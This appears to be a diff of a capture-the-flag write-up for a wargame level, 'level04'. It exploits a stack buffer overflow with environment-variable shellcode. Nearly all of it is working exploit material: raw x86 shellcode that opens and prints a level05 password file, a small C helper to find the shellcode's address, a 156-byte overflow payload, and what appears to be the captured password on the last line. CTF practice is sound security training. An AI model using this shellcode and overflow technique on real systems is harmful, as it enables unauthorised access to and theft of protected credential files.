@@ -3,21 +3,20 @@ ptrace checks for use of exec() so we have to use a shellcode without it
 
 this shellcode will open read and write from the provided path
 
-export SHELLCODE=$(python -c "print 64 * '\x90' + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff' + '/home/users/level05/.pass'")
+export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
 
-gdb level04
-set follow-fork-mode child
-b gets
-r
-x/50s *((char **) environ)
+getenv.c:
 
-0xffffd814:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311\315\200\211\306\353\006\260\001\061\333\315\200\211\363\260\003\203\354\001\215\f$\262\001\315\200\061\333\071\303t\346\260\004\263\001\262\001\315\200\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
+#include <stdio.h>
+#include <stdlib.h>
 
-at runtime our shellcode address can be altered
-(more environment variables added at runtime)
+int main(int argc, char *argv[]) {
+    printf("%p\n", getenv("SHELLCODE"));
+}
 
-python -c "print 156 * 'a' + '\xff\xff\xd8\x14'[::-1]" | ./level04
-python -c "print 156 * 'a' + '\xff\xff\xd8\x24'[::-1]" | ./level04
-python -c "print 156 * 'a' + '\xff\xff\xd8\x34'[::-1]" | ./level04
-python -c "print 156 * 'a' + '\xff\xff\xd8\x44'[::-1]" | ./level04
+gcc -m32 getenv.c
+./a.out
+0xffffd87a
+
+python -c "print 156 * 'a' + '\xff\xff\xd8\x7a'[::-1]" | ./level04
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
